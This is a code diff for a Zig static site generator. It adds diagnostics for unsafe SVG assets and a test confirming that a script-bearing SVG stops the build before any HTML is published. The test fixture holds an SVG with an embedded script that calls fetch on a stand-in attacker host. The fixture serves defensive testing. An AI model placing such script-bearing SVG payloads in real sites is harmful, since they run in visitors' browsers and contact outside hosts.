@@ -1622,9 +1622,14 @@ fn compilePagesInner(
         source_paths[i] = p.source_path;
         entity_ids[i] = p.entity_id;
     }
-    var content_assets = content_asset.loadSiteAssets(io, gpa, content_dir, source_paths, entity_ids) catch |err| {
+    var asset_discovery_fail: content_asset.FailInfo = .{};
+    var content_assets = content_asset.loadSiteAssets(io, gpa, content_dir, source_paths, entity_ids, &asset_discovery_fail) catch |err| {
         if (!options.quiet) {
-            std.debug.print("error: content-local asset discovery failed: {s}\n", .{@errorName(err)});
+            if (err == error.AssetUnsafeSvg) {
+                content_asset.printDiagnostic(gpa, error.AssetUnsafeSvg, "", asset_discovery_fail);
+            } else {
+                std.debug.print("error: content-local asset discovery failed: {s}\n", .{@errorName(err)});
+            }
         }
         return err;
     };
@@ -6290,6 +6295,46 @@ test "content-local assets: happy path rewrite and copy" {
     const asset = try readFileAlloc(io, cwd, asset_path, gpa);
     defer gpa.free(asset);
     try std.testing.expectEqualStrings("<svg id=\"v1\"/>", asset);
+}
+
+test "content-local assets: active SVG fails before HTML publish" {
+    const gpa = std.testing.allocator;
+    const io = std.testing.io;
+    const cwd = Io.Dir.cwd();
+    var tmp = std.testing.tmpDir(.{});
+    defer tmp.cleanup();
+    const work = try std.fmt.allocPrint(gpa, ".zig-cache/tmp/{s}/cla-active-svg", .{tmp.sub_path});
+    defer gpa.free(work);
+    try cwd.createDirPath(io, work);
+
+    try writeTreeFile(io, work, "content/index.md",
+        \\---
+        \\title: Home
+        \\---
+        \\
+        \\![logo](index.assets/logo.svg)
+        \\
+    );
+    try writeTreeFile(io, work, "content/index.assets/logo.svg", "<svg><script>fetch('https://attacker.example')</script></svg>");
+    try writeTreeFile(io, work, "layouts/main.html", "<html>{{content}}</html>");
+
+    const content = try std.fmt.allocPrint(gpa, "{s}/content", .{work});
+    defer gpa.free(content);
+    const layout = try std.fmt.allocPrint(gpa, "{s}/layouts/main.html", .{work});
+    defer gpa.free(layout);
+    const dist = try std.fmt.allocPrint(gpa, "{s}/dist", .{work});
+    defer gpa.free(dist);
+
+    try std.testing.expectError(error.AssetUnsafeSvg, compileHtmlSite(io, gpa, .{
+        .content_root = content,
+        .dist_dir = dist,
+        .layout_path = layout,
+        .quiet = true,
+    }));
+    var dist_dir = try cwd.openDir(io, dist, .{});
+    defer dist_dir.close(io);
+    try std.testing.expectError(error.FileNotFound, dist_dir.access(io, "index.html", .{}));
+    try std.testing.expectError(error.FileNotFound, dist_dir.access(io, "index.assets/logo.svg", .{}));
 }
 
 test "content-local assets: byte change does not re-render HTML" {
